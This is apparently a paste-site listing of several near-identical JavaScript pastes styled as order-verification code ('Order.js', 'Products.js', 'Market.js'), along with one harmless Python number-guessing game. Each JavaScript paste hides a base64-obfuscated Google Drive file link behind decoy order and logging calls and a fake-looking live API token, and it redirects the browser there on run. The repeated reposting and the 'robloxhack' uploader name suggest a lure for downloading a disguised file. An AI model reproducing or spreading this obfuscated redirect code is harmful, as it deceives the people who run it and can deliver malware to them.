  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8SGmJx0x,Untitled,robloxhack212,JavaScript,Saturday 29th of March 2025 01:10:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/358/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tprzWJgk,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:54:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/011/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dkqkfhsd,numberguesser,gruntfutuk,Python,Saturday 29th of March 2025 12:44:16 PM CDT,"from random import randint
import math
from dataclasses import dataclass

# Constants
LOWEST: int = 1
HIGHEST: int = 100
AFFIRMATION: frozenset[str] = frozenset({""yes"", ""y"", ""yeah"", ""sure"", ""ok"", ""okay""})
REJECTION: frozenset[str] = frozenset({""no"", ""n"", ""nope"", ""exit"", ""quit""})

@dataclass
class Params:
    correct: int
    lowest: int = LOWEST
    highest: int = HIGHEST
    attempts: int = HIGHEST - LOWEST + 1

def get_num(prompt: str = ""Enter a number: "", lowest: int = LOWEST, highest: int = HIGHEST) -> int:
    """""" Prompts user for and returns valid integer within range specified """"""
    while True:
        response: str = input(prompt).strip()
        try:
            num: int = int(response)
            if lowest <= num <= highest:
                return num
            raise ValueError
        except ValueError:
            print(f""Not valid. Expected whole number between {lowest} and {highest}"")

def get_guess(params: Params) -> int:
    """""" Gets the user's guess within the range and available attempts """"""
    return get_num(
        f""\nYou have {params.attempts} attempts left.""
        f""\nEnter a number between {params.lowest} and {params.highest}: "",
        params.lowest,
        params.highest
    )

def set_range() -> tuple[int, int]:
    """""" User sets range for random number generation, ensuring valid input """"""
    lowest: int = get_num(""Enter minimum number: "", LOWEST, int(HIGHEST / 1.5))
    highest: int = get_num(""Enter maximum number: "", lowest + 1, HIGHEST)  # Ensures highest > lowest
    return lowest, highest

def display_difficulty(levels: dict[str, tuple[str, float]]) -> None:
    """""" Displays difficulty levels to the user """"""
    print(""\nDifficulty Levels:"")
    for level, (desc, _) in levels.items():
        print(f""\t{level}: {desc}"")

def set_difficulty(levels: dict[str, tuple[str, float]], options: int) -> int:
    """""" User selects difficulty level, which determines the number of attempts """"""
    while True:
        display_difficulty(levels)
        choice: str = input(""Select a difficulty level (1-6): "").strip()
        if choice in levels:
            return math.ceil(options * levels[choice][1])
        print(""Invalid Selection: Try Again"")

def startup(levels: dict[str, tuple[str, float]]) -> Params:
    """""" Set and return game parameters with user input """"""
    print(""\n\n\nGuessing Number Game"")
    print(""*********************"")
    lowest: int
    highest: int
    lowest, highest = set_range()  # Explicit type hints applied before unpacking
    correct: int = randint(lowest, highest)
    attempts: int = set_difficulty(levels, highest - lowest + 1)
    return Params(correct, lowest, highest, attempts)

def play(params: Params) -> bool:
    """""" Play guessing game until player uses up all attempts and loses or guesses correctly and wins """"""
    over: bool = False  # Explicitly typed
    while not over and params.attempts > 0:
        user_guess: int = get_guess(params)
        params.attempts -= 1

        if user_guess == params.correct:
            print(f""\nYou Win! You had {params.attempts} attempts left."")
            over = True
        else:
            print(""Too High!"" if user_guess > params.correct else ""Too Low!"")

    if not over:
        print(f""\nYou Lose! The number was {params.correct}."")
    return over  # Explicitly returning boolean

def play_again() -> bool:
    """""" Ask user if they want to play again """"""
    while True:
        response: str = input(""\nWould you like to play again? (yes/no): "").strip().lower()
        if response in AFFIRMATION:
            return True
        if response in REJECTION:
            return False
        print(""Invalid response. Please enter yes or no."")

def main() -> None:
    """""" Main function to run the game """"""
    levels: dict[str, tuple[str, float]]
    levels = {
        ""1"": (""Easy"", 2),
        ""2"": (""Medium"", 1),
        ""3"": (""Hard"", 0.8),
        ""4"": (""Elite"", 0.5),
        ""5"": (""Master"", 0.4),
        ""6"": (""GrandMaster"", 0.05)
    }

    while True:
        params: Params = startup(levels)
        play(params)
        if not play_again():
            print(""\nThanks for playing! Goodbye."")
            break

if __name__ == ""__main__"":
    main()
"
jWz5ksW8,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:39:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/829/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qD6TwYir,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:23:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zgujskVb,Untitled,WassupDog45,JavaScript,Saturday 29th of March 2025 12:08:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/864/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
t0A594zB,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:53:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/711/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DP4GidVS,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:37:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/390/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NhQitCSt,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:22:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/470/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
